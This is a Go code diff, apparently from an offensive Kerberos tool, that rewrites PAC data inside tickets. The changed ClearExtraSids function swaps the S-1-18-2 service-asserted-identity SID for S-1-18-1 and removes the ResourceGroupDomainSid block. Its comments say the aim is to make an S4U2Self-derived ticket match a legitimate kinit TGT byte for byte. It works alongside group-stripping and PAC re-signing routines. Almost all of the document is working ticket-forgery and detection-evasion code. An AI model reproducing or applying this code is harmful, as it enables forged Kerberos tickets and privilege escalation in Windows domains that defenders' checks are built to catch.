@@ -839,28 +839,26 @@ func ExtractUserSIDFromPAC(pacData []byte) (*SID, error) {
 	return userSID, nil
 }
 
-// ClearExtraSids removes the ExtraSids array from the PAC's LOGON_INFO buffer
-// via proper NDR-level edits:
-//   1. Find SidCount (pattern: Reserved3=0, SidCount=1-10, ExtraSids ptr=referent)
-//   2. Set SidCount = 0 and ExtraSids pointer = NULL
-//   3. Find the ExtraSids deferred data (MaxCount + entry + SID) by locating
-//      the specific SID bytes (S-1-5-11 after substitution, S-1-18-2 or S-1-18-1
-//      otherwise)
-//   4. Remove those 28 bytes from the LOGON_INFO buffer data
-//   5. Update the LOGON_INFO internal NDR body size (the 4-byte value at
-//      buffer offset 8 — 16-byte NDR header contains the payload size)
-//   6. Update the LOGON_INFO size in the PAC's top-level buffer-info entry
-//   7. Shift all subsequent PAC bytes left by 28
-//   8. Update offsets of all subsequent PAC buffers
-//   9. Shrink the total PAC size
+// ClearExtraSids normalizes the ExtraSids array AND removes the
+// ResourceGroupDomainSid deferred block to match a legit MIT kinit AS-REQ TGT.
 //
-// Signatures are recomputed downstream by ResignPAC / ResignPACWithKeys.
+// Two coordinated NDR-level edits:
 //
-// Supports SidCount = 1 with a single authority-5 or authority-18 SID with
-// 1 sub-authority (28 bytes of deferred data). Other configurations are
-// bailed out of safely.
+//  1. ExtraSids substitution (no size change): replace the S-1-18-2
+//     (SERVICE_ASSERTED_IDENTITY) RPC_SID with S-1-18-1
+//     (AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY) in-place. Kinit TGTs
+//     carry exactly one extra SID = S-1-18-1 with SidCount=1.
 //
-// Returns the modified PAC bytes and 1 if ExtraSids was removed, 0 otherwise.
+//  2. ResourceGroupDomainSid strip (-28 bytes): null the
+//     ResourceGroupDomainSid_ptr in the fixed struct AND remove its 28-byte
+//     deferred block (4-byte conformance count + 24-byte RPC_SID for the
+//     domain SID). Kinit's PAC has this pointer null (no deferred data);
+//     S4U2Self emits a duplicate domain SID copy here.
+//
+// Net LOGON_INFO change: -28 bytes. This pairs with --strip-extra-groups
+// (-12 bytes from RID 572 in ResourceGroupIds) to match kinit's exact size.
+//
+// Returns the modified PAC bytes and 1 if changes were made, 0 otherwise.
 func ClearExtraSids(pacData []byte) ([]byte, int) {
 	parsed, err := ParsePACForSigning(pacData)
 	if err != nil {
@@ -870,104 +868,115 @@ func ClearExtraSids(pacData []byte) ([]byte, int) {
 	if logonBuf == nil {
 		return pacData, 0
 	}
-
 	bufStart := int(logonBuf.Offset)
 	bufEnd := bufStart + int(logonBuf.Size)
 
-	// Step 1: find SidCount + ExtraSids pointer position in the fixed struct.
-	sidCountPos := -1
-	for i := bufStart; i+12 <= bufEnd; i += 4 {
-		reserved3 := binary.LittleEndian.Uint32(pacData[i:])
-		sidCount := binary.LittleEndian.Uint32(pacData[i+4:])
-		extraSidsPtr := binary.LittleEndian.Uint32(pacData[i+8:])
-		if reserved3 != 0 {
-			continue
-		}
-		if sidCount != 1 { // only handle SidCount=1 case for now
-			continue
-		}
-		if extraSidsPtr == 0 || extraSidsPtr&0xFF000000 != 0 {
-			continue
-		}
-		sidCountPos = i + 4 // position of SidCount uint32
-		break
-	}
-	if sidCountPos < 0 {
-		return pacData, 0
-	}
+	// === Phase 1: in-place S-1-18-2 → S-1-18-1 substitution. ===
+	sid182 := []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x02, 0x00, 0x00, 0x00}
+	sid181 := []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x01, 0x00, 0x00, 0x00}
 
-	// Step 2: find the ExtraSids deferred data by locating the SID bytes.
-	// The SID is one of the known authority-5/18 patterns we might find:
-	// S-1-18-1 (legacy substitution), or S-1-18-2 (untouched).
-	sidPatterns := [][]byte{
-		{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x0b, 0x00, 0x00, 0x00}, // S-1-5-11
-		{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x02, 0x00, 0x00, 0x00}, // S-1-18-2
-		{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x01, 0x00, 0x00, 0x00}, // S-1-18-1
-	}
-	sidBytePos := -1
-	for _, pat := range sidPatterns {
-		for i := bufStart; i+len(pat) <= bufEnd; i++ {
-			if bytes.Equal(pacData[i:i+len(pat)], pat) {
-				sidBytePos = i
-				break
-			}
-		}
-		if sidBytePos >= 0 {
+	out := make([]byte, len(pacData))
+	copy(out, pacData)
+
+	extraSidEnd := -1
+	for i := bufStart; i+12 <= bufEnd; i++ {
+		if bytes.Equal(out[i:i+12], sid182) {
+			copy(out[i:i+12], sid181)
+			extraSidEnd = i + 12
 			break
 		}
 	}
-	if sidBytePos < 0 {
+	if extraSidEnd < 0 {
+		// Maybe already S-1-18-1 (re-run); locate it for phase 2.
+		for i := bufStart; i+12 <= bufEnd; i++ {
+			if bytes.Equal(out[i:i+12], sid181) {
+				extraSidEnd = i + 12
+				break
+			}
+		}
+	}
+	if extraSidEnd < 0 {
 		return pacData, 0
 	}
 
-	// Deferred data layout (28 bytes total for SidCount=1, 1-subauth SID):
-	//   [MaxCount: 4 bytes]        ← sidBytePos - 16
-	//   [SID referent + Attributes: 8 bytes]
-	//   [SID conformance count: 4 bytes]
-	//   [SID structure: 12 bytes]  ← sidBytePos
-	const deferredBytes = 28
-	deferredStart := sidBytePos - 16
-	deferredEnd := sidBytePos + 12
-	if deferredStart < bufStart || deferredEnd > bufEnd {
-		return pacData, 0
+	// === Phase 2: strip ResourceGroupDomainSid 28-byte deferred block. ===
+	// Per NDR pointer-encounter ordering in KERB_VALIDATION_INFO, the
+	// ResourceGroupDomainSid deferred data sits immediately after ExtraSids
+	// deferred. Layout (28 bytes):
+	//   [conformance count = 4 (matches SubAuthCount)] : 4 bytes
+	//   [RPC_SID for S-1-5-21-X-X-X = revision(1) + subAuthCount(1) +
+	//    authority(6) + 4 sub-auths × 4 bytes = 24 bytes]
+	deferredStart := extraSidEnd
+	deferredEnd := deferredStart + 28
+	if deferredEnd > bufEnd {
+		return out, 1 // phase 1 already applied; return without phase 2
 	}
 
-	// Step 3: compose the output — all bytes up through deferredStart,
-	// then skip 28, then rest of PAC, then update sizes and offsets.
-	newPAC := make([]byte, 0, len(pacData)-deferredBytes)
-	newPAC = append(newPAC, pacData[:sidCountPos]...)
-	// Write SidCount=0 and ExtraSids=NULL (8 bytes)
-	newPAC = append(newPAC, []byte{0, 0, 0, 0, 0, 0, 0, 0}...)
-	// Rest of fixed struct (up to deferredStart)
-	newPAC = append(newPAC, pacData[sidCountPos+8:deferredStart]...)
-	// Skip the 28-byte deferred data entirely
-	newPAC = append(newPAC, pacData[deferredEnd:]...)
+	// Validate the bytes look like a domain SID (S-1-5-21-X-X-X).
+	confCount := binary.LittleEndian.Uint32(out[deferredStart:])
+	if confCount != 4 {
+		return out, 1
+	}
+	if out[deferredStart+4] != 0x01 || // revision
+		out[deferredStart+5] != 0x04 || // subAuthCount
+		out[deferredStart+11] != 0x05 { // authority byte 7 (=5)
+		return out, 1
+	}
 
-	// Step 4: update the LOGON_INFO internal NDR body-size field.
-	// Layout: [4 bytes NDR version][4 bytes fill][4 bytes body size][4 bytes offset]
-	// So body size is at buffer offset 8.
+	// Find ResourceGroupDomainSid_ptr in the fixed struct.
+	// Pattern: [referent_ptr][small_count][referent_ptr] with both pointers
+	// looking like NDR referents (>= 0x00020000, high byte 0). Restricting
+	// to referent-shaped values filters out coincidental matches in deferred
+	// strings and group entries (which use small literal values).
+	// Take the LAST match before deferredStart — that's the genuine
+	// {ResourceGroupDomainSid_ptr, ResourceGroupCount, ResourceGroupIds_ptr}
+	// triple at the end of the fixed struct.
+	rgdsPtrPos := -1
+	for i := bufStart + 16; i+12 <= deferredStart; i += 4 {
+		ptr1 := binary.LittleEndian.Uint32(out[i:])
+		cnt := binary.LittleEndian.Uint32(out[i+4:])
+		ptr2 := binary.LittleEndian.Uint32(out[i+8:])
+		if ptr1 < 0x00020000 || ptr1&0xFF000000 != 0 {
+			continue
+		}
+		if ptr2 < 0x00020000 || ptr2&0xFF000000 != 0 {
+			continue
+		}
+		if cnt > 20 {
+			continue
+		}
+		rgdsPtrPos = i
+	}
+	if rgdsPtrPos < 0 {
+		return out, 1
+	}
+
+	// Build new PAC: 28 bytes removed from deferred area, ptr nulled.
+	const bytesRemoved = 28
+	newPAC := make([]byte, 0, len(out)-bytesRemoved)
+	newPAC = append(newPAC, out[:rgdsPtrPos]...)
+	newPAC = append(newPAC, []byte{0, 0, 0, 0}...) // RGDS_ptr = NULL
+	newPAC = append(newPAC, out[rgdsPtrPos+4:deferredStart]...)
+	newPAC = append(newPAC, out[deferredEnd:]...)
+
+	// Update LOGON_INFO body size (4 bytes at buffer offset 8).
 	bodySizePos := bufStart + 8
 	bodySize := binary.LittleEndian.Uint32(newPAC[bodySizePos:])
-	binary.LittleEndian.PutUint32(newPAC[bodySizePos:], bodySize-deferredBytes)
+	binary.LittleEndian.PutUint32(newPAC[bodySizePos:], bodySize-bytesRemoved)
 
-	// Step 5: update LOGON_INFO size in top-level PAC buffer-info entries.
-	// Header: cBuffers (4) + Version (4) = 8 bytes, then cBuffers * 16-byte entries.
+	// Update PAC buffer-info: shrink LOGON_INFO, shift later buffer offsets.
 	cBuffers := binary.LittleEndian.Uint32(newPAC[0:4])
 	for i := uint32(0); i < cBuffers; i++ {
 		entryOff := 8 + int(i)*16
-		bufType := binary.LittleEndian.Uint32(newPAC[entryOff:])
-		bufSize := binary.LittleEndian.Uint32(newPAC[entryOff+4:])
-		bufOffset := binary.LittleEndian.Uint64(newPAC[entryOff+8:])
-
-		if bufType == LogonInfoType {
-			// Shrink LOGON_INFO
-			binary.LittleEndian.PutUint32(newPAC[entryOff+4:], bufSize-deferredBytes)
-		} else if int(bufOffset) > bufStart {
-			// Buffers AFTER LOGON_INFO: shift offset by -deferredBytes
-			binary.LittleEndian.PutUint64(newPAC[entryOff+8:], bufOffset-uint64(deferredBytes))
+		bt := binary.LittleEndian.Uint32(newPAC[entryOff:])
+		bs := binary.LittleEndian.Uint32(newPAC[entryOff+4:])
+		bo := binary.LittleEndian.Uint64(newPAC[entryOff+8:])
+		if bt == LogonInfoType {
+			binary.LittleEndian.PutUint32(newPAC[entryOff+4:], bs-bytesRemoved)
+		} else if int(bo) > bufStart {
+			binary.LittleEndian.PutUint64(newPAC[entryOff+8:], bo-uint64(bytesRemoved))
 		}
 	}
-
 	return newPAC, 1
 }
 
@@ -1072,12 +1081,19 @@ func StripDeniedRODCGroup(pacData []byte) ([]byte, int) {
 	// Step 4: find the Count field in the fixed struct (GroupCount if attrs=0x7,
 	// ResourceGroupCount if attrs=0x20000007). Both patterns share:
 	//   [uint32 count == numEntries] [uint32 ptr: non-zero referent, high byte 0]
-	// Scan [bufStart+16, arrayMaxCountPos), take the LAST match (closest to the
-	// array — ResourceGroupCount is the last uint32 in the fixed struct, and
-	// GroupCount is also late in the fixed struct).
+	// Scan ONLY the fixed-struct region (first 240 bytes of LOGON_INFO buffer:
+	// 16-byte NDR common header + 4-byte conformant referent + 220-byte
+	// KERB_VALIDATION_INFO struct per MS-PAC 2.5). Restricting to fixed area
+	// avoids false matches in deferred data — e.g., the ExtraSids array
+	// MaxCount=1 + KSAA.sid_ptr referent pattern, which appears in deferred
+	// data when ExtraSids substitution preserved the array.
 	countPos := -1
 	expectedCount := uint32(numEntries)
-	for i := bufStart + 16; i+8 <= arrayMaxCountPos; i += 4 {
+	fixedEnd := bufStart + 240
+	if fixedEnd > arrayMaxCountPos {
+		fixedEnd = arrayMaxCountPos
+	}
+	for i := bufStart + 16; i+8 <= fixedEnd; i += 4 {
 		cnt := binary.LittleEndian.Uint32(pacData[i:])
 		ptr := binary.LittleEndian.Uint32(pacData[i+4:])
 		if cnt != expectedCount {
